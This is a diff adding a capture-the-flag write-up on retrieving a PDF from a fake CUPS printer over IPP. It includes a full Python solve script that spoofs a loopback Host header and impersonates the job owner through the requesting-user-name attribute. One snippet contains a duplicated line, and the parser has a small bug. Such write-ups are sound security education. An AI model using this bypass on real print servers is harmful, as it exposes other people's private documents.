@@ -525,7 +525,282 @@ if __name__ == '__main__':
 
 `TeamItaly{Wh4t_h4v3_y0u_d0n3_e27fc07e}`
 
+## misc/rev - Save a Tree (1 solve, 500 points)
+
+The goal is to retrieve a flag from a .pdf file exposed via IPP on a fake printer. We needed to find the username that owns the correct print job, use CUPS-specific CUPS-Get-Document operation to download the document and wrap IPP packets over HTTP in both directions.
+
+<Callout title="IPP/CUPS fundamentals" variant="important">
+IPP (Internet Printing Protocol) runs over HTTP(S) and uses binary packets.
+
+Every IPP packet contains:
+	1.	Version (2 bytes)
+	2.	operation_id (2 bytes) — like `0x4002 = Get-Printer-Attributes`, `0x4027 = CUPS-Get-Document`
+	3.	request_id (4 bytes)
+	4.	Attribute groups (tags + data)
+	5.	End of attributes (0x03)
+
+CUPS-Get-Document returns the raw bytes of a document attached to a job.
+</Callout>
+
+Therefore we need to implement a minimal IPP client with some helper functions to encode attributes, as follows
+
+```python
+def encode_attribute(tag, name, value):
+    encoded = bytearray()
+    encoded += tag
+    encoded += len(name).to_bytes(2, 'big') + name
+    encoded += len(value).to_bytes(2, 'big') + value
+    return encoded
+```
+
+These helpers build the IPP attribute payload. `build_ipp_request(operation_id, attributes)` concatenates the header, attribute groups, and the terminating tag.
+
+### Crafting CUPS-Get-Document
+
+```python title=cups_get_document.py
+def create_cups_get_document_request(printer_name, username, job_id, document_number):
+    attributes = [
+        encode_attribute(TAG_CHARSET, b'attributes-charset', b'utf-8'),
+        encode_attribute(TAG_LANGUAGE, b'attributes-natural-language', b'en-us'),
+        encode_attribute(TAG_URI, b'printer-uri', b'ipp://127.0.0.1/printers/' + printer_name.encode()),
+        encode_attribute(TAG_INTEGER, b'job-id', job_id.to_bytes(4, 'big')),
+        encode_attribute(TAG_INTEGER, b'document-number', document_number.to_bytes(4, 'big')),
+        encode_attribute(TAG_NAME, b'requesting-user-name', username.encode()),
+    ]
+    return build_ipp_request(CUPS_GET_DOCUMENT, attributes)
+```
+
+The crucial attribute is printer-uri pointing at ipp://127.0.0.1/blabla , on the HTTP layer, spoof the Host header to look like an internal request.
+
+<Callout title="First Vulnerability" variant="important">
+Using `Host: 127.0.0.1` makes the request appear local to the CUPS instance, enabling routes/permissions intended only for loopback.
+</Callout>
+
+```python title=send.py
+response = requests.post(
+    url,
+    headers={
+        "Host": "127.0.0.1",                       # key bypass
+        "Content-Type": "application/ipp",
+        "User-Agent": "CUPS/2.4.7 ...",
+        "Expect": "100-continue",
+    },
+    data=data
+)
+```
+
+### Parsing the IPP response
+
+`parse_ipp_response()` walks the binary stream, printing attributes until it hits 0x03 (end of attributes). Everything after that tag is the document payload, so our .pdf file.
+
+```python title=parse.py
+extra_data = parse_ipp_response(response.content)
+if extra_data:
+    with open('out.pdf', 'wb') as f:
+        f.write(extra_data)extra_data = parse_ipp_response(response.content)
+```
+
+Using `Get-Jobs` and `Get-Job-Attributes`, we enumerate jobs and discover the job is owned by remroot. More investigation shows that the CUPS server is misconfigured and does not validate the password, it trusts the value of the requesting-user-name attribute. Setting requesting-user-name=remroot is enough to authorize retrieval, yippe!.
+
+<Callout title="Auth flaw" variant="note">
+AuthZ was effectively “by header value”. CUPS accepted requesting-user-name at face value and skipped real credential checks.
+</Callout>
 
 
+```python title=solve.py
+import requests
+import string
 
+IPP_VERSION = b'\x02\x00'
+
+# Operation IDs
+GET_PRINTER_ATTRIBUTES = b'\x40\x02'
+GET_JOBS = b'\x00\x0A'
+GET_JOB_ATTRIBUTES = b'\x00\x09'
+CUPS_GET_DOCUMENT = b'\x40\x27'
+
+REQUEST_ID = b'\x00\x00\x00\x01'
+ATTRIBUTES_TAG = b'\x01'
+END_OF_ATTRIBUTES_TAG = b'\x03'
+
+# Attribute Tags
+TAG_INTEGER = b'\x21'
+TAG_NAME = b'\x42'
+TAG_KEYWORD = b'\x44'
+TAG_URI = b'\x45'
+TAG_CHARSET = b'\x47'
+TAG_LANGUAGE = b'\x48'
+
+ATTRIBUTES_CHARSET = b'attributes-charset'
+ATTRIBUTES_LANGUAGE = b'attributes-natural-language'
+REQUESTED_ATTRIBUTES = b'requested-attributes'
+
+CHARSET_UTF8 = b'utf-8'
+LANGUAGE_ENUS = b'en-us'
+
+JOB_ATTRIBUTES = [
+    b"job-id",
+    b"job-k-octets",
+    b"job-name",
+    b"job-originating-user-name",
+    b"job-printer-state-message",
+    b"job-printer-uri",
+    b"job-state-reasons",
+    b"time-at-creation",
+    b"time-at-completed",
+]
+
+def encode_attribute(tag, name, value):
+    encoded = bytearray()
+    encoded += tag
+    encoded += len(name).to_bytes(2, 'big') + name
+    encoded += len(value).to_bytes(2, 'big') + value
+    return encoded
+
+def encode_multiple_keywords(tag, name, values):
+    encoded = bytearray()
+    encoded += tag
+    encoded += len(name).to_bytes(2, 'big') + name
+    encoded += len(values[0]).to_bytes(2, 'big') + values[0]
+    for val in values[1:]:
+        encoded += tag
+        encoded += b'\x00\x00'
+        encoded += len(val).to_bytes(2, 'big') + val
+    return encoded
+
+def build_ipp_request(operation_id, attributes):
+    req = bytearray()
+    req += IPP_VERSION
+    req += operation_id
+    req += REQUEST_ID
+    req += ATTRIBUTES_TAG
+
+    for attr in attributes:
+        req += attr
+
+    req += END_OF_ATTRIBUTES_TAG
+    return req
+
+def create_get_printer_attributes_request():
+    attributes = [
+        encode_attribute(TAG_CHARSET, ATTRIBUTES_CHARSET, CHARSET_UTF8),
+        encode_attribute(TAG_LANGUAGE, ATTRIBUTES_LANGUAGE, LANGUAGE_ENUS),
+        encode_multiple_keywords(TAG_KEYWORD, REQUESTED_ATTRIBUTES, [
+            b'printer-name',
+            b'printer-type', b'printer-location', b'printer-info',
+            b'printer-make-and-model', b'printer-state', b'printer-state-message',
+            b'printer-state-reasons', b'printer-uri-supported', b'device-uri',
+            b'printer-is-shared', b'printer-uuid', b'printer-resolution',
+        ])
+    ]
+    return build_ipp_request(GET_PRINTER_ATTRIBUTES, attributes)
+
+def create_get_jobs_request(username):
+    attributes = [
+        encode_attribute(TAG_CHARSET, ATTRIBUTES_CHARSET, CHARSET_UTF8),
+        encode_attribute(TAG_LANGUAGE, ATTRIBUTES_LANGUAGE, LANGUAGE_ENUS),
+        encode_attribute(TAG_URI, b'printer-uri', b'ipp://127.0.0.1/'),
+        encode_multiple_keywords(TAG_KEYWORD, REQUESTED_ATTRIBUTES, JOB_ATTRIBUTES),
+        encode_attribute(TAG_NAME, b'requesting-user-name', username.encode()),
+    ]
+    return build_ipp_request(GET_JOBS, attributes)
+
+def create_get_jobs_attributes_request(job_id, username):
+    attributes = [
+        encode_attribute(TAG_CHARSET, ATTRIBUTES_CHARSET, CHARSET_UTF8),
+        encode_attribute(TAG_LANGUAGE, ATTRIBUTES_LANGUAGE, LANGUAGE_ENUS),
+        encode_attribute(TAG_URI, b'job-uri', f'ipp://127.0.0.1/jobs/{job_id}'.encode()),
+        encode_attribute(TAG_NAME, b'requesting-user-name', username.encode()),
+    ]
+    return build_ipp_request(GET_JOB_ATTRIBUTES, attributes)
+
+def create_cups_get_document_request(printer_name: str, username: str, job_id: int, document_number: int):
+    attributes = [
+        encode_attribute(TAG_CHARSET, ATTRIBUTES_CHARSET, CHARSET_UTF8),
+        encode_attribute(TAG_LANGUAGE, ATTRIBUTES_LANGUAGE, LANGUAGE_ENUS),
+        encode_attribute(TAG_URI, b'printer-uri', b'ipp://127.0.0.1/printers/' + printer_name.encode('utf-8')),
+        encode_attribute(TAG_INTEGER, b'job-id', job_id.to_bytes(4, 'big')),
+        encode_attribute(TAG_INTEGER, b'document-number', document_number.to_bytes(4, 'big')),
+        encode_attribute(TAG_NAME, b'requesting-user-name', username.encode('utf-8')),
+    ]
+    return build_ipp_request(CUPS_GET_DOCUMENT, attributes)
+
+
+def send_ipp_request(url, data):
+    headers = {
+        "Host": "127.0.0.1", 
+        "Content-Type": "application/ipp",
+        "User-Agent": "CUPS/2.4.7 (Linux 6.8.0-58-generic; x86_64) IPP/2.0",
+        "Expect": "100-continue"
+    }
+    response = requests.post(url, headers=headers, data=data)
+    return response
+
+def parse_ipp_response(data):
+    idx = 0
+    version = data[idx:idx+2]; idx += 2
+    status_code = data[idx:idx+2]; idx += 2
+    request_id = data[idx:idx+4]; idx += 4
+
+    print(f"IPP Version: {version.hex()}, Status Code: {status_code.hex()}, Request ID: {int.from_bytes(request_id, 'big')}")
+    
+    current_tag = None
+    while idx < len(data):
+        tag = data[idx]; idx += 1
+
+        if tag == 0x03:  
+            print("End of attributes")
+            break
+        elif tag in (0x01, 0x02, 0x04):  
+            current_tag = tag
+            print(f"\nAttribute Group Tag: {hex(tag)}")
+            continue
+
+        name_length = int.from_bytes(data[idx:idx+2], 'big')
+        idx += 2
+        
+        name = data[idx:idx+name_length].decode('utf-8') if name_length else '' 
+        idx += name_length
+
+        value_length = int.from_bytes(data[idx:idx+2], 'big')
+        idx += 2
+        
+        value = data[idx:idx+value_length]
+        idx += value_length 
+        
+        try:
+            decoded_value = value.decode('utf-8')
+            if all(c in string.printable for c in decoded_value):
+                output = decoded_value
+            else:
+                output = value.hex()
+        except UnicodeDecodeError:
+            decoded_value = value.hex()
+
+        name = name or '(cont.)'
+        print("  ", name, ":", output)
+    
+    return data[idx:]
+
+SERVER = "challenge01.it"
+PORT = 38761
+
+
+url = f"http://{SERVER}:{PORT}/"
+username = 'remroot' 
+
+
+data = create_cups_get_document_request('Office_Printer', username, 1, 1)
+response = send_ipp_request(url, data)
+
+extra_data = parse_ipp_response(response.content)
+
+if extra_data:
+    with open('out.pdf', 'wb') as f:
+        f.write(extra_data)
+```
+
+And opening the retrieved out.pdf gives us the flag
+
+![flag](assets/flag2.png)
 
